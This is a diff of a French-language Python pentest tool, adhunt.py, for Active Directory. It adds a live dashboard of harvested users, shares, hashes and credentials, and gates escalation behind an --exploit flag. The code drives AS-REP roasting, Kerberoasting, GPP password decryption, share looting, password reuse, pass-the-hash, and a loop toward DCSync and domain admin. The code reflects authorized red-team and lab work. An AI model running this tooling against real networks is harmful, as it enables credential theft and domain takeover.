@@ -1,28 +1,27 @@
 #!/usr/bin/env python3
 """
-adhunt.py - Enumeration & pentest Active Directory de A a Z
-===========================================================
-Orchestrateur AD facon couteau suisse : deroule les phases d'un pentest AD,
-pilote les vrais outils (netexec/nxc, impacket, ldap3, kerbrute, certipy,
-bloodhound-python) quand ils sont presents, avec fallback PUR-PYTHON sinon.
+adhunt.py - Enumeration Active Directory (tableau de bord vivant)
+=================================================================
+L'utilisateur a DEJA fait son nmap et fournit l'IP du DC : adhunt NE SCANNE PAS.
+Il ENUMERE et AFFICHE ses trouvailles dans un tableau de bord qui se met a jour
+au fur et a mesure (users -> shares -> hashes -> crack -> creds). Le narratif et
+les erreurs vont dans loot/<domaine>/debug.log (ecran = infos seulement).
 
-  Phase 0  DECOUVERTE        : scan ports AD, repere les DC, rootDSE, SMB signing,
-                               clock skew Kerberos (sonde SMB2 pur-python)
-  Phase 1  ENUM NON-AUTH     : password policy, null session, RID cycling,
-                               kerbrute (enum users), AS-REP roasting, LDAP anon
-  Phase 2  MOT DE PASSE      : password spraying LOCKOUT-AWARE (auto-throttle)
-  Phase 3  ENUM AUTH         : dump LDAP pur-python (kerberoastable/asrep/UAC/
-                               deleg/descriptions), Kerberoast, GPP cpassword,
-                               ADCS (certipy), delegations, BloodHound
-  Phase 4  ESCALADE/LATERAL  : cartographie creds->hotes (nxc), admin local,
-                               secretsdump (si --yes et pas --safe)
-  Phase 5  RAPPORT           : report.md priorise + report.json + loot/
+Il pilote les vrais outils (netexec/nxc, impacket, ldap3, kerbrute, certipy,
+bloodhound-python, hashcat/john) quand ils sont presents, fallback pur-python.
+
+  RECON      : confirme les services AD (LDAP/SMB/Kerberos/DNS) + rootDSE (PAS de scan)
+  ENUM NON-AUTH : password policy, null/RID cycling, kerbrute, AS-REP + Kerberoast guest
+  ENUM AUTH  : dump LDAP (kerberoastable/asrep/UAC/deleg/descriptions), Kerberoast,
+               GPP cpassword, LAPS, gMSA, BloodHound, FOUILLE des shares
+  CRACK      : hashcat/john (auto) -> reinjecte les mots de passe trouves
+  ESCALADE   : SEULEMENT avec --exploit (DCSync, ADCS/ESC, RBCD/shadow, DACL, disk hunt)
+  RAPPORT    : report.md priorise + report.json + loot/
 
 Usage :
-    python adhunt.py 10.10.10.0/24                 # decouverte du subnet
-    python adhunt.py dc01.corp.local --anon        # + enum anonyme
-    python adhunt.py 10.10.10.10 -d corp.local -u user -p 'Pass1'  --all
-    python adhunt.py 10.10.10.10 -d corp.local -u user -H <ntlmhash> --safe
+    python adhunt.py 10.10.10.10 -d corp.local                     # enum non-auth
+    python adhunt.py 10.10.10.10 -d corp.local -u user -p 'Pass1'  # enum auth complete
+    python adhunt.py 10.10.10.10 -d corp.local -u user -H <nt> --exploit --loop
 
 [!] Usage AUTORISE uniquement (pentest/red team/CTF/lab). Rester DANS le scope.
 """
@@ -52,12 +51,148 @@ if os.name == "nt":
         for a in ("G", "Y", "R", "B", "CY", "GR", "BD", "X"):
             setattr(C, a, "")
 
-def log(m): print(m)
+VERBOSE = False        # --verbose : reaffiche aussi le bruit (progression/erreurs)
+DEBUGF = None          # fichier debug.log (ouvert dans main)
+_ANSI = re.compile(r"\033\[[0-9;]*m")
+# prefixes de BRUIT (progression, erreurs, warnings) -> caches de l'ecran par defaut
+_NOISE = ("[i]", "[-]", "[!]", "[.]", "[~]", "[*]", "[?]")
+
+def _raw(m): print(m)
+
+def log(m):
+    """Info ecran. Le BRUIT (progression/erreurs, prefixes [i]/[-]/[!]/...) part
+    dans debug.log et n'apparait a l'ecran qu'avec --verbose. Le reste (titres,
+    tableaux, findings [+], rapport) s'affiche normalement."""
+    plain = _ANSI.sub("", str(m)).lstrip()
+    noise = plain.startswith(_NOISE)
+    if DEBUGF:
+        try:
+            DEBUGF.write(_ANSI.sub("", str(m)) + "\n"); DEBUGF.flush()
+        except Exception:
+            pass
+    if noise and not VERBOSE:
+        return
+    _raw(m)
+
+def dbg(m):
+    """Bruit explicite : uniquement dans debug.log (jamais a l'ecran sauf --verbose)."""
+    if DEBUGF:
+        try:
+            DEBUGF.write(_ANSI.sub("", str(m)) + "\n"); DEBUGF.flush()
+        except Exception:
+            pass
+    if VERBOSE:
+        _raw(m)
 
 def stage(title):
-    log(f"\n{C.B}{C.BD}{'='*68}{C.X}")
-    log(f"{C.B}{C.BD}  {title}{C.X}")
-    log(f"{C.B}{C.BD}{'='*68}{C.X}")
+    dbg(f"\n=== {title} ===")
+    if getattr(BOARD, "state", None) is not None:
+        BOARD.set_status(title)      # ligne de statut du tableau de bord
+    else:
+        _raw(f"\n{C.B}{C.BD}  {title}{C.X}")
+
+# ----------------------------------------------------------------------
+# TABLEAU DE BORD VIVANT : les findings s'accumulent et le tableau concerne
+# se redessine a chaque nouveau "bon truc" trouve (users/shares/creds/hash/crack).
+# ----------------------------------------------------------------------
+class Board:
+    """Rend un tableau de bord depuis `state` : users / shares / hashes / creds.
+    Se redessine (efface l'ecran) a chaque appel. Le narratif + les erreurs vont
+    dans debug.log (via log()/dbg()), l'ecran ne montre QUE les trouvailles."""
+    def __init__(self):
+        self.state = None
+        self.status = ""
+        self.enabled = True
+
+    def bind(self, state):
+        self.state = state
+
+    def set_status(self, msg):
+        self.status = msg
+        dbg(f"[*] {msg}")
+        self.redraw()
+
+    def _cred_rows(self):
+        rows = []
+        for c in (self.state.get("creds") or []):
+            u = c.get("user") or "?"
+            if c.get("password"):
+                secret = c["password"]
+            elif c.get("hash"):
+                secret = "NT:" + str(c["hash"]).split(":")[-1][:12] + "..."
+            else:
+                secret = "-"
+            rows.append([u, secret, c.get("src") or "-"])
+        return rows
+
+    def redraw(self):
+        if not (self.enabled and self.state):
+            return
+        st = self.state
+        try:
+            tty = sys.stdout.isatty()
+        except Exception:
+            tty = False
+        if tty:
+            _raw("\033[2J\033[H")                    # efface l'ecran, curseur en haut
+        else:
+            _raw("\n" + "=" * 60)                    # sortie redirigee : simple separateur
+        dom = st.get("domain") or "?"
+        dc = st.get("dc") or "?"
+        _raw(f"{C.CY}{C.BD}  adhunt  ::  domaine {dom}  ::  DC {dc}{C.X}")
+        if self.status:
+            _raw(f"{C.GR}  > {self.status}{C.X}")
+        sections = [
+            ("[ UTILISATEURS ]", ["samAccountName", "flags", "description"],
+             st.get("user_rows") or [], C.X),
+            ("[ SHARES / FICHIERS SENSIBLES ]", ["hote", "share", "fichier", "pourquoi"],
+             st.get("share_rows") or [], C.CY),
+            ("[ HASHES A CRAQUER ]", ["user", "type"], st.get("hash_rows") or [], C.Y),
+            ("[ CREDENTIALS  (mdp / hash / crack) ]", ["user", "secret", "source"],
+             self._cred_rows(), C.G),
+        ]
+        for title, headers, rows, col in sections:
+            if not rows:
+                continue
+            _raw(f"\n{C.CY}{C.BD}  {title}  {C.GR}({len(rows)}){C.X}")
+            show_table(headers, rows, color=col, cap=40)
+        _raw("")
+
+BOARD = Board()
+
+def _dedup_row(state, key, row):
+    """Ajoute une ligne unique dans state[key] (listes de findings du Board)."""
+    lst = state.setdefault(key, [])
+    seen = state.setdefault("_seen_" + key, set())
+    sig = "|".join(str(x) for x in row).lower()
+    if sig in seen:
+        return False
+    seen.add(sig)
+    lst.append([str(x) if x is not None else "-" for x in row])
+    return True
+
+def board_user(state, sam, flags, desc):
+    if _dedup_row(state, "user_rows", [sam, flags or "-", (desc or "-")[:60]]):
+        BOARD.redraw()
+
+def board_share(state, host, share, fname, why):
+    if _dedup_row(state, "share_rows", [host, share, fname, why]):
+        BOARD.redraw()
+
+def board_hash(state, user, htype):
+    if _dedup_row(state, "hash_rows", [user, htype]):
+        BOARD.redraw()
+
+def record_cred(state, user, password=None, nthash=None, src=""):
+    """Point unique d'enregistrement d'un cred -> alimente le Board en direct."""
+    for c in state.get("creds", []):
+        if (c.get("user") or "").lower() == (user or "").lower() and \
+           c.get("password") == password and c.get("hash") == nthash:
+            return c
+    cred = {"user": user, "password": password, "hash": nthash, "src": src}
+    state.setdefault("creds", []).append(cred)
+    BOARD.redraw()
+    return cred
 
 def table_lines(headers, rows):
     """Rend une table ASCII alignee (liste de lignes texte)."""
@@ -139,20 +274,9 @@ COMMON_PORTS = {
 }
 PORT_NAMES = {**COMMON_PORTS, **AD_PORTS}   # AD prioritaire pour le nom
 
-def default_ports():
-    """Ports par defaut : AD + services courants (ne rate plus le web/ftp/rpc-http)."""
-    return sorted(set(AD_PORTS) | set(COMMON_PORTS))
-
-def full_scan_nmap(ip, timeout=1200):
-    """Scan complet 1-65535 via nmap (rapide, -p-) -> liste des ports ouverts."""
-    if not shutil.which("nmap"):
-        return None
-    rc, out, _ = run_cmd(["nmap", "-p-", "-T4", "--open", "-Pn",
-                          "--min-rate", "1500", ip], timeout)
-    return [int(m.group(1)) for m in re.finditer(r"^(\d+)/tcp\s+open", out, re.M)]
-
 # ----------------------------------------------------------------------
-# Scan de ports (pur python, threade)
+# Confirmation de service (pur python, threade) - PAS un scan nmap :
+# on teste juste les ports AD connus sur la cible que l'utilisateur fournit.
 # ----------------------------------------------------------------------
 def scan_host(ip, ports, timeout=1.2):
     open_ports = []
@@ -182,25 +306,6 @@ def scan_network(hosts, ports, threads=100, timeout=1.2):
                 results[ip] = op
     sys.stdout.write("\r" + " " * 40 + "\r")
     return results
-
-def nmap_versions(ip, ports, timeout=300):
-    """nmap -sV sur les ports ouverts -> {port: (service, version)}."""
-    import shutil as _sh
-    if not _sh.which("nmap") or not ports:
-        return {}
-    pl = ",".join(str(p) for p in ports)
-    try:
-        pr = __import__("subprocess").run(["nmap", "-sV", "-Pn", "-T4", "-p", pl, ip],
-                                          capture_output=True, text=True, timeout=timeout)
-        out = pr.stdout
-    except Exception:
-        return {}
-    ver = {}
-    for line in out.splitlines():
-        m = re.match(r"(\d+)/tcp\s+open\s+(\S+)\s*(.*)", line)
-        if m:
-            ver[int(m.group(1))] = (m.group(2), m.group(3).strip())
-    return ver
 
 # ----------------------------------------------------------------------
 # Sonde SMB2 brute (pur python) : signing requis ? + clock skew + dialecte
@@ -342,34 +447,20 @@ def smb_null_info(ip, timeout=5):
         return None
 
 # ----------------------------------------------------------------------
-# PHASE 0 : DECOUVERTE
+# RECON : confirmation des services AD (PAS de scan nmap - l'utilisateur a
+# deja scanne et fournit l'IP du/des DC). On confirme juste LDAP/SMB/Kerberos/DNS
+# repondent, on lit le rootDSE (domaine/foret) et on fingerprinte SMB.
 # ----------------------------------------------------------------------
-def phase0_discovery(targets, args):
-    stage("PHASE 0 - DECOUVERTE")
-    audit(f"PHASE0 scan {len(targets)} hosts full={getattr(args,'full',False)}")
-    found = {}
-    if getattr(args, "full", False) and shutil.which("nmap"):
-        # scan COMPLET 1-65535 via nmap (ne rate aucun port ouvert)
-        log(f"{C.GR}[i] Scan COMPLET (-p-) via nmap sur {len(targets)} hote(s) "
-            f"(peut etre long)...{C.X}")
-        for ip in targets:
-            op = full_scan_nmap(ip)
-            if op:
-                found[ip] = op
-    else:
-        if getattr(args, "full", False):
-            ports = list(range(1, 65536))
-            log(f"{C.Y}[i] Scan COMPLET 1-65535 en pur-python (long, installe nmap pour +vite)...{C.X}")
-        elif getattr(args, "ports", None):
-            ports = [int(p) for p in re.split(r"[,\s]+", args.ports) if p.isdigit()]
-            log(f"{C.GR}[i] Scan de {len(ports)} port(s) demandes sur {len(targets)} hote(s)...{C.X}")
-        else:
-            ports = default_ports()
-            log(f"{C.GR}[i] Scan de {len(ports)} ports (AD + services courants) sur "
-                f"{len(targets)} hote(s)... (-p- / --full pour tout){C.X}")
-        found = scan_network(targets, ports, threads=args.threads, timeout=args.timeout)
+def confirm_services(targets, args, state):
+    stage("RECON - SERVICES AD (pas de scan : cible fournie)")
+    audit(f"RECON confirm {len(targets)} hosts")
+    BOARD.set_status("recon : confirmation des services AD...")
+    # sonde LEGERE des seuls ports AD connus (confirmation, pas un scan de ports)
+    ad_ports = sorted(AD_PORTS)
+    found = scan_network(targets, ad_ports, threads=args.threads, timeout=args.timeout)
     if not found:
-        log(f"{C.R}[!] Aucun port ouvert trouve. Verifie le reseau/scope (ou essaie --full).{C.X}")
+        log(f"{C.R}[!] Aucun service AD ne repond sur la/les cible(s). "
+            f"Verifie l'IP du DC (celle que TON nmap a trouvee) et le reseau.{C.X}")
         return {}
 
     hosts = {}
@@ -431,12 +522,9 @@ def phase0_discovery(targets, args):
             col = C.G if abs(sk) < 120 else C.R
             warn = "" if abs(sk) < 300 else f"  {C.R}<- Kerberos KO (>5min), sync l'horloge{C.X}"
             log(f"      horloge  : ecart {col}{sk:+d}s{C.X}{warn}")
-        # table ports / service / version (nmap -sV sur les DC si nmap present)
-        ver = nmap_versions(ip, rec["ports"]) if rec["is_dc"] else {}
-        prows = [[p, "tcp", ver.get(p, (PORT_NAMES.get(p, "?"), ""))[0],
-                  (ver.get(p, ("", ""))[1] or "")[:48]] for p in rec["ports"]]
-        show_table(["PORT", "PROTO", "SERVICE", "VERSION"], prows, C.G, cap=40)
-        save_table(args, f"ports_{ip}.txt", ["PORT", "PROTO", "SERVICE", "VERSION"], prows)
+        # table services (pas de version : on ne relance pas de scan nmap)
+        prows = [[p, "tcp", PORT_NAMES.get(p, "?")] for p in rec["ports"]]
+        save_table(args, f"services_{ip}.txt", ["PORT", "PROTO", "SERVICE"], prows)
 
     # synthese
     log(f"\n{C.CY}{C.BD}[=] {len(hosts)} hote(s) AD, dont {len(dcs)} DC : "
@@ -452,6 +540,10 @@ def phase0_discovery(targets, args):
                 args.domain = r["domain"]
                 log(f"{C.GR}[i] Domaine auto-detecte : {args.domain}{C.X}")
                 break
+    # renseigne le tableau de bord (entete domaine/DC)
+    state["domain"] = args.domain
+    state["dc"] = dcs[0] if dcs else (list(hosts)[0] if hosts else None)
+    BOARD.redraw()
     return hosts
 
 # ======================================================================
@@ -708,10 +800,10 @@ def phase1_unauth(hosts, args, state):
     # TABLE des utilisateurs confirmes (affichage + sauvegarde)
     if confirmed:
         save_loot(args, "confirmed_users.txt", "\n".join(confirmed) + "\n")
-        log(f"\n{C.CY}{C.BD}[=] {len(confirmed)} utilisateur(s) confirme(s) :{C.X}")
         urows = [[i + 1, u] for i, u in enumerate(confirmed)]
-        show_table(["#", "UTILISATEUR"], urows, C.G)
         save_table(args, "users_table.txt", ["#", "UTILISATEUR"], urows)
+        for u in confirmed:
+            board_user(state, u, "-", "")
     elif roast_users:
         log(f"{C.GR}[i] {len(roast_users)} candidats (seed, non valides) -> AS-REP en aveugle.{C.X}")
 
@@ -743,7 +835,7 @@ def kerberoast_guest(args, state, dc):
         n = len(open(outfile, encoding="utf-8", errors="ignore").read().splitlines())
         add_finding(state, "HIGH", f"Kerberoast via Guest : {n} ticket(s) service (sans creds)",
                     f"hashcat -m 13100 {outfile} rockyou.txt", dc)
-        state.setdefault("hashes", {})["kerberoast"] = outfile
+        register_hashfile(state, "kerberoast", outfile)
 
 def spray_reuse(args, state, dc):
     """Reutilisation de mot de passe : spray les mdp DEJA trouves sur TOUS les users."""
@@ -765,8 +857,7 @@ def spray_reuse(args, state, dc):
         user, pw = m.group(2), m.group(3)
         if not any(c.get("user") == user and c.get("password") == pw
                    for c in state.get("creds", [])):
-            state.setdefault("creds", []).append(
-                {"user": user, "password": pw, "hash": None, "src": "reuse"})
+            record_cred(state, user, password=pw, src="reuse")
             add_finding(state, "HIGH", f"Reutilisation de mot de passe : {user}:{pw}",
                         "meme mdp qu'un autre compte -> re-enum (boucle)", dc)
 
@@ -784,7 +875,7 @@ def phase_asrep(dc, args, state, label=""):
             n = len(open(outfile, encoding="utf-8", errors="ignore").read().splitlines())
             add_finding(state, "HIGH", f"AS-REP roasting : {n} compte(s) sans pre-auth",
                         f"hashcat -m 18200 {outfile} rockyou.txt", dc)
-            state.setdefault("hashes", {})["asrep"] = outfile
+            register_hashfile(state, "asrep", outfile)
     else:
         log(f"{C.GR}[i] GetNPUsers.py (impacket) absent -> AS-REP roast saute.{C.X}")
 
@@ -942,15 +1033,15 @@ def loot_shares_host(args, state, host):
                 except Exception:
                     continue
                 looted.append(f"\\\\{host}\\{share}\\{full}")
-                for user, pw in _parse_creds_from_bytes(buf.getvalue()):
+                creds_here = _parse_creds_from_bytes(buf.getvalue())
+                board_share(state, host, share, name,
+                            "cred en clair !" if creds_here else "fichier sensible")
+                for user, pw in creds_here:
                     if user.lower() in ("username", "user", "administrator") and pw == "":
                         continue
-                    cred = {"user": user, "password": pw, "hash": None, "src": f"share:{name}"}
-                    if not any(c.get("user") == user and c.get("password") == pw
-                               for c in state.get("creds", [])):
-                        state.setdefault("creds", []).append(cred)
-                        add_finding(state, "CRIT", f"Cred en clair dans {name} : {user}:{pw}",
-                                    f"\\\\{host}\\{share}\\{full}", host)
+                    record_cred(state, user, password=pw, src=f"share:{name}")
+                    add_finding(state, "CRIT", f"Cred en clair dans {name} : {user}:{pw}",
+                                f"\\\\{host}\\{share}\\{full}", host)
     for sh in shares:
         try:
             name = str(sh['shi1_netname']).rstrip("\x00")
@@ -1090,9 +1181,8 @@ def enum_gpp_impacket(args, state, dc):
     for m in re.finditer(r"[Uu]sername\s*:\s*(\S+).*?[Pp]assword\s*:\s*(\S+)", out, re.S):
         user, pw = m.group(1).split("\\")[-1], m.group(2)
         if user and pw and pw.lower() != "none":
-            cred = {"user": user, "password": pw, "hash": None, "src": "GPP"}
             if not any(c.get("user") == user and c.get("password") == pw for c in state.get("creds", [])):
-                state.setdefault("creds", []).append(cred)
+                record_cred(state, user, password=pw, src="GPP")
                 add_finding(state, "CRIT", f"GPP cpassword dechiffre : {user}:{pw}",
                             "mot de passe en clair depuis SYSVOL (Groups.xml)", dc)
 
@@ -1162,6 +1252,15 @@ def ldap_dump(conn, base, state, args):
             interesting["admincount"].append(sam)
         if desc and re.search(r"pass|pwd|mot de passe|cred|secret", desc, re.I):
             interesting["desc_secrets"].append(f"{sam}: {desc[:80]}")
+        # tableau de bord : ligne user (flags courts + description)
+        short = []
+        if spn and str(spn): short.append("SPN")
+        if "DONT_REQ_PREAUTH" in flags: short.append("AS-REP")
+        if str(getattr(e, "adminCount", "") or "") == "1": short.append("adminCount")
+        if "PWD_NOTREQD" in flags: short.append("PWD_NOTREQD")
+        if "TRUSTED_FOR_DELEGATION" in flags: short.append("UNCONSTRAINED")
+        if "DISABLED" in flags: short.append("disabled")
+        board_user(state, sam, ",".join(short) or "-", desc)
     # COMPUTERS (pagination complete)
     for e in ldap_search_all(conn, base, "(objectClass=computer)",
                              ["sAMAccountName", "operatingSystem", "userAccountControl",
@@ -1451,7 +1550,7 @@ def phase3_authenum(hosts, args, state):
             n = len(open(outfile, encoding="utf-8", errors="ignore").read().splitlines())
             add_finding(state, "HIGH", f"Kerberoasting : {n} ticket(s) service extraits",
                         f"hashcat -m 13100 {outfile} rockyou.txt", dc)
-            state.setdefault("hashes", {})["kerberoast"] = outfile
+            register_hashfile(state, "kerberoast", outfile)
 
     # AS-REP (vue authentifiee, si users.txt existe)
     phase_asrep(dc, args, state, label="auth")
@@ -1607,6 +1706,14 @@ def _hashfile_users(path):
         pass
     return users
 
+def register_hashfile(state, htype, path):
+    """Enregistre un fichier de hashes ET alimente le tableau de bord (par user)."""
+    state.setdefault("hashes", {})[htype] = path
+    label = {"asrep": "AS-REP (18200)", "kerberoast": "Kerberoast (13100)",
+             "ntds": "NTDS (NTLM)"}.get(htype, htype)
+    for u in sorted(_hashfile_users(path)):
+        board_hash(state, u, label)
+
 def _pot_paths():
     """Emplacements possibles du john.pot (existants uniquement)."""
     cands = [os.path.expanduser("~/.john/john.pot"), "john.pot",
@@ -1727,8 +1834,7 @@ def crack_hashes(args, state):
             if 0 < len(pw) < 60 and "$krb5" not in pw and user != "usr":
                 if not any(c.get("user") == user and c.get("password") == pw
                            for c in state.get("creds", [])):
-                    state.setdefault("creds", []).append(
-                        {"user": user, "password": pw, "hash": None, "src": kind})
+                    record_cred(state, user, password=pw, src=f"{kind}-crack")
                     add_finding(state, "HIGH", f"Cred CRACKEE ({kind}) : {user}:{pw}",
                                 "reutilisable -> re-enum (boucle)")
                     new += 1
@@ -1912,8 +2018,7 @@ def add_cred_hash(state, user, nthash, src):
     if not (user and nt):
         return
     if not any(c.get("user") == user and c.get("hash") == nt for c in state.get("creds", [])):
-        state.setdefault("creds", []).append(
-            {"user": user, "password": None, "hash": nt, "src": src})
+        record_cred(state, user, nthash=nt, src=src)
         add_finding(state, "CRIT", f"Hash NT obtenu : {user} ({src})",
                     "reutilisable -> re-enum / pass-the-hash (boucle)")
 
@@ -1961,8 +2066,7 @@ def hunt_disk_creds(args, state, dc):
                 continue
             if not any(x.get("user", "").lower() == user.lower() and x.get("password") == pw
                        for x in state.get("creds", [])):
-                state.setdefault("creds", []).append(
-                    {"user": user, "password": pw, "hash": None, "src": "disk"})
+                record_cred(state, user, password=pw, src="disk")
                 add_finding(state, "CRIT", f"Cred sur le disque (via {u}) : {user}:{pw}",
                             "trouve dans un fichier/script sur C:\\ -> nouvel acces", dc)
 
@@ -2279,9 +2383,9 @@ def parse_targets(target):
 
 # ----------------------------------------------------------------------
 BANNER = f"""{C.CY}{C.BD}
-  adhunt.py  -  enumeration & pentest Active Directory (A -> Z){C.X}
-{C.GR}  decouverte -> non-auth -> mot de passe -> auth -> escalade -> rapport{C.X}
-{C.Y}  by 12akHack{C.GR}  -  outil de securite offensive{C.X}
+  adhunt.py  -  enumeration Active Directory (tableau de bord vivant){C.X}
+{C.GR}  users -> shares -> hashes -> crack -> creds   (escalade: --exploit){C.X}
+{C.Y}  by 12akHack{C.GR}  -  tu fournis l'IP du DC (pas de scan nmap ici){C.X}
 {C.R}  [!] Usage AUTORISE uniquement : reste STRICTEMENT dans le scope.{C.X}
 """
 
@@ -2301,19 +2405,23 @@ def main():
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 ------------------------------------------------------------------------
- GUIDE
+ GUIDE  (tu as deja fait ton nmap -> donne l'IP du DC)
 ------------------------------------------------------------------------
- Decouverte d'un subnet (repere les DC, signing, clock skew) :
-    python adhunt.py 10.10.10.0/24
+ Enum non-auth (users, AS-REP guest, roast+crack) :
+    python adhunt.py 10.10.10.10 -d corp.local
 
- Cible unique + enum anonyme :
-    python adhunt.py 10.10.10.10 --anon
+ Enum AUTHENTIFIEE complete (LDAP, roast, GPP/LAPS, shares, crack) :
+    python adhunt.py 10.10.10.10 -d corp.local -u jdoe -p 'Ete2024!'
 
- Pipeline complet authentifie :
-    python adhunt.py 10.10.10.10 -d corp.local -u jdoe -p 'Ete2024!' --all
+ Avec un hash NTLM (pass-the-hash) :
+    python adhunt.py 10.10.10.10 -d corp.local -u jdoe -H <nthash>
 
- Avec un hash NTLM (pass-the-hash), mode lecture seule :
-    python adhunt.py 10.10.10.10 -d corp.local -u jdoe -H <lm:nt> --all --safe
+ + ESCALADE offensive (DCSync/ADCS/RBCD/DACL/disk) + boucle jusqu'au DA :
+    python adhunt.py 10.10.10.10 -d corp.local -u jdoe -p 'Pass1' --exploit --loop
+
+ Options : --spray (password spray, opt-in), --safe (lecture seule),
+           --verbose (montre le detail a l'ecran), -o (dossier de sortie).
+ Le detail complet (progression, erreurs) va dans loot/<domaine>/debug.log.
 
  /!\\ Reste STRICTEMENT dans le scope autorise de l'engagement.
 ------------------------------------------------------------------------
@@ -2338,11 +2446,13 @@ def main():
     p.add_argument("--wordlist", help="Wordlist pour le crack auto (defaut: rockyou si present)")
     p.add_argument("--passwordlist", help="Wordlist de mots de passe pour le spray (defaut: liste integree)")
     p.add_argument("--crack-timeout", type=int, default=900, help="Timeout crack hashcat/john (defaut 900s)")
-    p.add_argument("-p-", "--full", dest="full", action="store_true",
-                   help="Scan COMPLET des 65535 ports (via nmap si present) - ne rate aucun port")
-    p.add_argument("--ports", help="Ports a scanner (ex: 80,443,8080) au lieu du set par defaut")
-    p.add_argument("-t", "--threads", type=int, default=100, help="Threads scan (defaut 100)")
-    p.add_argument("--timeout", type=float, default=1.2, help="Timeout port (defaut 1.2s)")
+    p.add_argument("--exploit", action="store_true",
+                   help="Active l'ESCALADE offensive (DCSync, ADCS/ESC, RBCD/shadow, DACL, disk hunt). "
+                        "Sans ce flag : enumeration + roast + crack + affichage SEULEMENT.")
+    p.add_argument("--verbose", action="store_true",
+                   help="Reaffiche a l'ecran le narratif + les erreurs (sinon dans debug.log)")
+    p.add_argument("-t", "--threads", type=int, default=100, help="Threads sonde services (defaut 100)")
+    p.add_argument("--timeout", type=float, default=1.2, help="Timeout par service (defaut 1.2s)")
     p.add_argument("-o", "--loot", default="loot", help="Dossier de sortie (defaut loot/)")
     args = p.parse_args()
 
@@ -2350,71 +2460,77 @@ def main():
     if not args.target:
         p.print_help(); sys.exit(0)
 
+    global VERBOSE, DEBUGF, AUDIT
+    VERBOSE = args.verbose
+
     ext, libs = detect_env()
-    log(f"{C.GR}[i] Outils externes : {', '.join(ext) if ext else 'aucun (fallback pur-python)'}{C.X}")
-    log(f"{C.GR}[i] Libs python     : {', '.join(libs) if libs else 'aucune (pip install ldap3 impacket pour +)'}{C.X}")
+    dbg(f"[i] Outils externes : {', '.join(ext) if ext else 'aucun (fallback pur-python)'}")
+    dbg(f"[i] Libs python     : {', '.join(libs) if libs else 'aucune (pip install ldap3 impacket)'}")
 
     targets = parse_targets(args.target)
     # dossier de sortie base sur le domaine (ou la cible)
     label = re.sub(r"[^\w.-]", "_", args.domain or args.target)
     args.loot = os.path.join(args.loot, label)
     os.makedirs(args.loot, exist_ok=True)
-    global AUDIT
+    DEBUGF = open(os.path.join(args.loot, "debug.log"), "a", encoding="utf-8")
     AUDIT = open(os.path.join(args.loot, "audit.log"), "a", encoding="utf-8")
-    audit(f"START target={args.target} domain={args.domain} user={args.user} safe={args.safe}")
-
-    log(f"{C.GR}[i] Cibles : {len(targets)} | sortie : {args.loot}/{C.X}")
-    if args.safe:
-        log(f"{C.G}[i] Mode --safe : lecture seule, aucune action active.{C.X}")
+    audit(f"START target={args.target} domain={args.domain} user={args.user} exploit={args.exploit}")
+    dbg(f"[i] Cibles : {len(targets)} | sortie : {args.loot}/ | debug.log pour le detail")
     start = time.time()
 
-    state = {"target": args.target, "domain": args.domain, "hosts": {},
-             "findings": [], "users": [], "creds": [], "hashes": {}}
+    state = {"target": args.target, "domain": args.domain, "dc": None, "hosts": {},
+             "findings": [], "users": [], "creds": [], "hashes": {},
+             "user_rows": [], "share_rows": [], "hash_rows": []}
+    BOARD.bind(state)
 
-    # Phase 0 (toujours)
-    hosts = phase0_discovery(targets, args)
+    # RECON : confirmation des services (PAS de scan nmap - tu fournis l'IP du DC)
+    hosts = confirm_services(targets, args, state)
     state["hosts"] = hosts
     state["domain"] = args.domain
 
-    # Phase 1 : non-auth (si --anon/--all)
-    if args.anon or args.all:
-        phase1_unauth(hosts, args, state)
-    # Phase 2 : spray (si --spray/--all et pas --safe)
-    if (args.spray or args.all) and not args.safe:
-        phase2_password(hosts, args, state)
-    elif (args.spray or args.all) and args.safe:
-        log(f"\n{C.Y}[i] Phase 2 (spray) ignoree en mode --safe.{C.X}")
+    # ENUMERATION NON-AUTH (toujours : users via RID/kerbrute, AS-REP guest, roast+crack)
+    phase1_unauth(hosts, args, state)
 
-    # Phases 3-4 : auth (creds fournies OU trouvees en phase 2), avec boucle
+    # SPRAY : opt-in seulement (risque de lockout), jamais en --safe
+    if args.spray and not args.safe:
+        phase2_password(hosts, args, state)
+
+    # ENUM AUTHENTIFIEE (si creds fournies -u/-p/-H OU trouvees ci-dessus)
+    # -> LDAP dump, roast, GPP/LAPS/gMSA, shares (fouille), crack. Escalade offensive
+    #    UNIQUEMENT avec --exploit (sinon on n'affiche que ce qu'on trouve).
     authed = effective_creds(args, state)
-    if args.all and authed:
+    if authed:
         tried = set()
-        for it in range(1, 4):   # max 3 iterations de boucle
+        for it in range(1, 4):                         # max 3 tours de boucle
             tried.add((args.user, args.password or args.nthash))
             before = len(state.get("creds", []))
-            phase3_authenum(hosts, args, state)
-            phase4_escalation(hosts, args, state)
+            phase3_authenum(hosts, args, state)        # enum + roast + crack + shares
+            if args.exploit and not args.safe:
+                phase4_escalation(hosts, args, state)  # DCSync/ADCS/RBCD/DACL/disk (gate)
             if not args.loop or len(state.get("creds", [])) == before:
                 break
-            # promouvoir un nouveau cred non encore essaye pour re-enumerer
             nxt = next((c for c in state["creds"]
                         if (c.get("user"), c.get("password") or c.get("hash")) not in tried), None)
             if not nxt:
                 break
             args.user, args.password, args.nthash = nxt.get("user"), nxt.get("password"), nxt.get("hash")
-            log(f"\n{C.CY}{C.BD}[BOUCLE] Nouveau cred -> re-enum avec {args.user} "
-                f"(iteration {it+1}).{C.X}")
-    elif args.all and not authed:
-        log(f"\n{C.Y}[i] Phases 3-4 (auth) ignorees : pas de creds (-u/-p ou -H).{C.X}")
+            dbg(f"[BOUCLE] Nouveau cred -> re-enum avec {args.user} (iteration {it+1}).")
+    else:
+        dbg("[i] Pas de creds (-u/-p ou -H) : enum non-auth uniquement.")
 
-    # Phase 5 : rapport (toujours) + commande suivante suggeree
+    # RAPPORT (toujours) : redessine le board final puis ecrit le rapport
+    BOARD.redraw()
     phase5_report(state, args)
     suggest_next(args, state)
 
-    log(f"\n{C.GR}Termine en {time.time()-start:.1f}s | loot: {args.loot}/{C.X}")
+    _raw(f"\n{C.GR}Termine en {time.time()-start:.1f}s | loot: {args.loot}/ "
+         f"(detail: debug.log){C.X}")
     audit("END")
-    if AUDIT:
-        AUDIT.close()
+    for fh in (AUDIT, DEBUGF):
+        try:
+            fh and fh.close()
+        except Exception:
+            pass
 
 
 if __name__ == "__main__":
